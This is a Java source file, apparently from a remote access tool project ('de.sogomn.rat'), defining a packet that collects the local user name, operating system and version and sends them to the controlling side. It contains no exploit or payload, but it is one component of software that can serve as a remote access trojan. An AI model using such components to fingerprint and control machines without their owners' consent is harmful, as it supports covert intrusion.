/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.Constants;

public final class InformationPacket extends AbstractPingPongPacket {
	
	private String name, os, version;
	
	public InformationPacket(final String name, final String location, final String os, final String version) {
		this.name = name;
		this.os = os;
		this.version = version;
		
		type = DATA;
	}
	
	public InformationPacket() {
		this("", "", "", "");
		
		type = REQUEST;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		connection.writeUtf(name);
		connection.writeUtf(os);
		connection.writeUtf(version);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		name = connection.readUtf();
		os = connection.readUtf();
		version = connection.readUtf();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		type = DATA;
		name = System.getProperty("user.name");
		os = System.getProperty("os.name");
		version = Constants.VERSION;
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		//...
	}
	
	public String getName() {
		return name;
	}
	
	public String getOs() {
		return os;
	}
	
	public String getVersion() {
		return version;
	}
	
}
